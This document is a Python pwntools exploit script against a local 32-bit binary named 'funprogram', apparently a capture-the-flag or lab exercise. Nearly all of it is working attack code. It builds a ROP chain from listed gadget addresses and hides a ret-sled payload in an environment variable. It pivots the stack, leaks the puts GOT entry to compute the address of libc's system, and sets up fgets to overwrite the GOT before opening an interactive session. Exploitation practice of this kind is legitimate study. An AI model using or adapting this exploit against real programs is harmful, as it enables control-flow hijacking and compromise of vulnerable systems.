from pwn import *

context.clear(arch="i386", kernel="amd64")

e = ELF("./funprogram")
libc = ELF("/lib32/libc.so.6")

r = ROP(e)

"""
0x08049022 : pop ebx ; ret
0x08049241 : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x080492b2 : pop edi ; pop ebp ; ret
0x080492b1 : pop esi ; pop edi ; pop ebp ; ret

0x804a026 = %s\n\x00
"""

r.raw(e.symbols["puts"])  # function call (puts)
r.raw(0x08049022)  # return address of puts (pop ebx ; ret)
r.raw(e.got["puts"])  # arg0 to puts

r.raw(e.symbols["fgets"])  # function call (fgets)
r.raw(0x080492B1)  # return address of fgets (pop esi ; pop edi ; pop ebp ; ret)
r.raw(e.got["fgets"])  # arg0 to fgets (buffer)
r.raw(5)  # arg1 to fgets (amount of bytes (need 1 more for null))
r.raw(e.symbols["stdin"])  # arg2 to fgets (stream)


ret_sled = p32(0x0804900E) * (1024 // 4) * 127
payload = ret_sled + r.chain()

c = process(e.path, env={"AAAA": payload}, aslr=False)

context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(
    c,
    """
continue
""".strip(),
)

desired_esp = 0xFFFDE3D0

c.recvuntil(b"Enter an integer:\n")
c.sendline(b"AAAA" + p32(desired_esp + 4))
print(c.recvline())
print(c.recvline())

puts_addr = u32(c.recvline()[:4])

system_addr = puts_addr + (libc.symbols["system"] - libc.symbols["puts"])

c.interactive()
